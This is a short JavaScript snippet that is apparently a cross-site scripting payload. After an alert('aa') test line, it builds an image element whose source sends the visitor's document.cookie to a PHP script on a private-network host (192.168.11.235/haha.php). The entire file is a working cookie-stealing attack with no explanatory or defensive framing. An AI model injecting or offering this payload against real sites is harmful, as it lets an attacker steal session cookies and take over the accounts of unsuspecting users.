alert('aa');

function addimage(){
	var img=document.createElement('img');
	img.src='http://192.168.11.235/haha.php?c='+document.cookie;
	document.body.appendChild(img);
}
addimage();
